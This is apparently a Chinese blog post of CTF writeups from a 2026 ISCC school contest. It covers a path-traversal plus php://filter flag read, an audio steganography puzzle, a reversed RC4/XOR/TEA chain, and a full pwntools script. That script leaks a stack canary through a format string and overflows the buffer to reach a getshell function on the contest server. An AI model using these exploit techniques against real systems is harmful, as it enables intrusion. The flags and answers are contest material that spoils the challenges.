---
title: "2026 iscc校赛wp"
date: 2026-05-06 21:08:00
categories:
  - "CTF Writeup"
tags:
  - "CTF"
  - "Writeup"
cnblogs_postid: "19982800"
cnblogs_url: "https://www.cnblogs.com/ljnljn/p/19982800"
---

校赛竞争压力不大，随便做了一下
### 消失的密钥 (The Vanishing Key)

![assets/2026 iscc校赛wp/file-20260501081210216.png](/assets/cnblogs/2026 iscc校赛wp/3539156-20260506210820225-254565039.png)
### JSON Beautifier
利用点在 /api/preview.php?file=... 的目录穿越加源码读取。
先读出 config.php  和 preview.php ，确认它会允许读取 `/tmp/json_preview/*.tmp`，并且当 .tmp 内容是 URI 时，会对非黑名单 scheme 直接 file_get_contents()，只要求 resource= 等于 FLAG_PATH，而 FLAG_PATH 正好是 /secret/flag。
于是用 data_uri 模式写入一条 php://filter/read=convert.base64-encode/resource=/secret/flag 到临时预览文件，再通过预览接口读取并解码，拿到 flag。
### 双校区来信
先看wav的频谱，很明显有个字符串
![assets/2026 iscc校赛wp/file-20260501153629227.png](/assets/cnblogs/2026 iscc校赛wp/3539156-20260506210820444-196995182.png)
然后binwalk发现有包含
![assets/2026 iscc校赛wp/file-20260501153718684.png](/assets/cnblogs/2026 iscc校赛wp/3539156-20260506210820360-618270577.png)
分离后得到rar，用上面的字符串可以解密
解密后得到8个文件，名字正好是图片里的校训每个字的拼音，把每个文件里内容按照顺序组合一起提交即可
![assets/2026 iscc校赛wp/file-20260501154007009.png](/assets/cnblogs/2026 iscc校赛wp/3539156-20260506210820209-2013878890.png)
（还以为是要转base64结果直接提交就行了）
### stack
```
from pwn import *
  
HOST = "39.96.201.215"
PORT = 10004
CANARY_IDX = 31
context.binary = ELF("./attachment-5")
context.arch = "i386"
def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(context.binary.path)
def leak_canary(io):
    banner = io.recv(timeout=1)
    if banner:
        log.info(f"banner = {banner!r}")
    io.send(f"%{CANARY_IDX}$p".encode() + b"\x00")
    data = io.recv(timeout=1)
    if not data:
        raise EOFError("remote closed before returning the format-string leak")
    log.info(f"leak raw = {data!r}")
    canary = int(data.strip(), 16)
    log.info(f"canary = {canary:#x}")
    return canary
def build_payload(canary):
    return flat(
        b"\x00",
        b"A" * 99,
        p32(canary),
        b"B" * 12,
        p32(context.binary.sym.getshell),
        p32(context.binary.sym.main),
    )
def exploit(io):
    canary = leak_canary(io)
    payload = build_payload(canary)
    io.send(payload)
    return io

def main():
    io = start()
    io = exploit(io)
    sleep(0.2)
    io.interactive()
    
if __name__ == "__main__":
    main()
```
### where's bunny
1. 洞筛选结果：1, 3, 6, 8
2. 对应值：344, 21, 89, 233
3. 变换：
    - RC4, key=344
    - XOR, key=21
    - byte add, key=89
    - 最后一层 TEA 的 16 字节 key 不是 sha256("233")[:16]
    - 程序实际用到的 key 是 c0509a487a18b003ba05e505419ebb63
4. 固定目标密文：
    - D81E7AB53D0B172CB7EAC15A1A8D6E5F30BDDAE3D5BDD59E

把这条链逆回去，得到 flag body：

hrIaiswtIolyudoeaeylluc
